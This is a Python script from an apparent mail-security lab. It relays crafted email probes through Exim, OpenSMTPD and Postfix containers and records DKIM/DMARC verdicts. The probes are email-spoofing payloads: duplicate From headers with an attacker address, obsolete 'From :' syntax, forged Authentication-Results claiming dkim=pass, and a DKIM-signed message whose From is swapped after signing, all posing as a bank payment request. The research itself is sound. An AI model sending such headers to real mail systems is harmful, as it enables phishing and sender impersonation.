"""Attack 1: heterogeneous MTA repair matrix (L1 framework from Forward Pass).

Question: which single-hop properties (obs-From normalization, U-label policy
void, group silence, 8-bit field-name zone termination, foreign-AR survival,
duplicate-From handling, obs-colon signature survival) PERSIST, BREAK, or are
CREATED after relaying through Exim 4.96 or OpenSMTPD 6.8 instead of direct
delivery? Byte-level transform checklist + authentication verdicts per path.
"""
from __future__ import annotations

import json
import re
import subprocess
import sys
import time
from pathlib import Path

sys.path.insert(0, "/mnt/e/MailSecLab/received-lab")
from research import reference, structure
from research.lib.evidence import sha256_bytes

RUN = Path("/mnt/e/MailSecLab/received-lab/results/research/w2-20261002a")
STAGE = RUN / "repair"
EVIDENCE = "/evidence/w2-20261002a/repair"
KEY = Path("/mnt/e/MailSecLab/received-lab/results/research/w1-20261001a/keys/priv.pem")
H = ["from", "to", "date", "subject", "message-id"]
VICTIM = "xn--mnchen-3ya.lab.test"
NFC = "m\u00fcnchen.lab.test"

PATHS = {"direct": ("msl-auth-postfix", 25), "exim": ("exim", 25), "osmtpd": ("opensmtpd", 25)}


def build_probe(name: str, case_id: str) -> bytes:
    body = b"\r\nPlease confirm the payment.\r\nCase: " + case_id.encode() + b"\r\n"
    tail = (b"To: bob@lab.test\r\nDate: Sat, 3 Oct 2026 21:00:00 +0000\r\n"
            + ("Subject: repair %s\r\n" % name).encode()
            + ("Message-ID: <%s@lab.test>\r\n" % case_id).encode()
            + ("X-Case-ID: %s\r\n" % case_id).encode() + body)
    if name == "ctl":
        return f"From: Bank Security <security@{VICTIM}>\r\n".encode() + tail
    if name == "ctl-signed":
        base = f"From: Bank Security <security@{VICTIM}>\r\n".encode() + tail
        signed, _ = reference.sign(base, KEY, H, mode="relaxed", domain=VICTIM, selector="cal")
        return signed
    if name == "obs-top":
        return f"From : Bank Security <security@{VICTIM}>\r\n".encode() + tail
    if name == "obs-mid":
        return ("X-Case-ID: %s\r\n" % case_id).encode() + f"From : Bank Security <security@{VICTIM}>\r\n".encode() + (
            b"To: bob@lab.test\r\nDate: Sat, 3 Oct 2026 21:00:00 +0000\r\n"
            + ("Subject: repair %s\r\n" % name).encode()
            + ("Message-ID: <%s@lab.test>\r\n" % case_id).encode() + body)
    if name == "ulabel":
        return f"From: Bank Security <security@{NFC}>\r\n".encode() + tail
    if name == "group":
        return f"From: Bank: security@{VICTIM};\r\n".encode() + tail
    if name == "dl":
        return b"From: Bank Security <security@[203.0.113.7]>\r\n" + tail
    if name == "bit8-name":
        return (f"From: Bank Security <security@{VICTIM}>\r\n".encode()
                + b"X-\xc3\x9cnknow: one\r\n" + tail)
    if name == "ar-foreign":
        return (b"Authentication-Results: receiver.example; dkim=pass (2048-bit key) "
                + f"header.d={VICTIM} header.b=ZZFZ9\r\n".encode()
                + f"From: Spoofed <author@{VICTIM}>\r\n".encode() + tail)
    if name == "dup-from":
        return (b"From: Attacker <attacker@evil.test>\r\n"
                + f"From: Bank Security <security@{VICTIM}>\r\n".encode() + tail)
    if name == "signed-obs":
        base = f"From: Bank Security <security@{VICTIM}>\r\n".encode() + tail
        signed, _ = reference.sign(base, KEY, H, mode="relaxed", domain=VICTIM, selector="cal")
        info = structure.inspect(signed)
        field = next(f for f in info["fields"] if f["name"] == "from")
        obs = f"From : Bank Security <security@{VICTIM}>\r\n".encode()
        return signed[:field["start"]] + obs + signed[field["end"]:]
    raise ValueError(name)


PROBES = ["ctl", "ctl-signed", "obs-top", "obs-mid", "ulabel", "group", "dl",
          "bit8-name", "ar-foreign", "dup-from", "signed-obs"]


def sh(args, timeout=90, stdin=None):
    proc = subprocess.run(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=timeout, check=False, input=stdin)
    return proc.returncode, proc.stdout.decode("utf-8", "replace"), proc.stderr.decode("utf-8", "replace")


FETCH_SCRIPT = r'''
import imaplib, json, sys
case = sys.argv[1]
m = imaplib.IMAP4("msl-dovecot", 143)
m.login("bob", "lab-bob")
m.select("INBOX", readonly=True)
typ, data = m.search(None, "ALL")
out = {"found": False}
for item in reversed(data[0].split()):
    typ, msg = m.fetch(item, "(BODY.PEEK[HEADER.FIELDS (X-CASE-ID)])")
    blob = (msg[0][1] or b"") if msg and msg[0] else b""
    if case.encode() not in blob:
        continue
    typ, full = m.fetch(item, "(BODY.PEEK[])")
    raw = full[0][1]
    open(f"/evidence/w2-20261002a/repair/{case}.stored.eml", "wb").write(raw)
    out = {"found": True, "uid": item.decode(), "bytes": len(raw)}
    break
m.logout()
print(json.dumps(out))
'''


def fetch_stored(case_id: str, tries: int = 10, delay: float = 1.0):
    last = {"found": False}
    for _ in range(tries):
        code, out, _ = sh(["docker", "exec", "-i", "msl-client", "python3", "-", case_id],
                          timeout=60, stdin=FETCH_SCRIPT.encode())
        try:
            last = json.loads(out)
        except json.JSONDecodeError:
            last = {"found": False}
        if last.get("found"):
            return last
        time.sleep(delay)
    return last


def unfold_ars(raw: bytes):
    lines = raw[:raw.find(b"\r\n\r\n")].split(b"\r\n")
    out = []
    for l in lines:
        if l.startswith((b"\t", b" ")) and out:
            out[-1] += b" " + l.strip()
        else:
            out.append(l)
    return [l.decode("utf-8", "replace") for l in out if b"Authentication-Results" in l]


def transform_facts(orig: bytes, stored: bytes) -> dict:
    info = structure.inspect(stored)
    return {
        "from_count": info["counts"].get("from", 0),
        "obs_from_survives": b"From :" in stored,
        "mailbox_line": b"X-Mailbox-Line" in stored,
        "bit8_name_survives": b"X-\xc3\x9c" in stored,
        "from_in_body": stored.find(b"\r\n\r\n") >= 0 and b"From:" in stored[stored.find(b"\r\n\r\n") + 4:stored.find(b"\r\n\r\n") + 200],
        "foreign_ar_survives": b"receiver.example" in stored,
        "relay_chain": [h for h in ("by exim", "by opensmtpd", "by msl-auth-postfix") if h.encode() in stored],
    }


def main() -> None:
    STAGE.mkdir(parents=True, exist_ok=True)
    rows = []
    for probe in PROBES:
        for path, (server, port) in PATHS.items():
            case_id = f"rp-{probe}-{path}"
            raw = build_probe(probe, case_id)
            (STAGE / f"{probe}-{path}.eml").write_bytes(raw)
            code, out, err = sh([
                "docker", "exec", "msl-client", "python3", "/opt/research/lib/smtp_send.py",
                "--server", server, "--port", str(port),
                "--mail-from", "alice@lab.test", "--rcpt-to", "bob@lab.test",
                "--input", f"{EVIDENCE}/{probe}-{path}.eml",
                "--transcript", f"{EVIDENCE}/{probe}-{path}.smtp.txt",
            ], timeout=90)
            try:
                sent = json.loads(out)
            except json.JSONDecodeError:
                sent = {"accepted": False, "raw": (out or err)[-150:]}
            stored = fetch_stored(case_id) if sent.get("accepted") else {"found": False}
            spath = STAGE / f"{probe}-{path}.stored.eml"
            ars, facts = [], {}
            if spath.exists():
                sraw = spath.read_bytes()
                ars = unfold_ars(sraw)
                facts = transform_facts(raw, sraw)
            text = " ".join(ars)
            dm = re.search(r"dmarc=(\w+)", text)
            dk = re.search(r"dkim=(\w+)", text)
            time.sleep(0.4)
            code, rout, _ = sh(["docker", "exec", "msl-rspamd", "sh", "-c",
                                f"grep 'id: <rp-{probe}-{path}@lab.test>' /var/log/rspamd/rspamd.log | grep write_log | tail -1"], timeout=30)
            rs = "absent"
            m2 = re.search(r"(DMARC_POLICY_[A-Z_]+|R_DKIM_[A-Z]+)", rout or "")
            if m2:
                rs = m2.group(1)
            row = {"probe": probe, "path": path, "smtp": (sent.get("reply") or "")[:30],
                   "smtp_code": (sent.get("reply") or "")[:3], "delivered": stored.get("found"),
                   "dmarc": dm.group(1) if dm else "absent", "dkim": dk.group(1) if dk else "absent",
                   "rspamd": rs, "facts": facts, "sha256": sha256_bytes(raw)}
            rows.append(row)
            print(json.dumps({"p": probe, "path": path, "code": row["smtp_code"],
                              "dm": row["dmarc"], "rsp": row["rspamd"],
                              "obs": facts.get("obs_from_survives"), "ml": facts.get("mailbox_line"),
                              "fcount": facts.get("from_count")}, ensure_ascii=False), flush=True)
            time.sleep(0.8)
    (STAGE / "matrix.json").write_text(json.dumps({"rows": rows}, ensure_ascii=False, indent=1), encoding="utf-8")


if __name__ == "__main__":
    main()
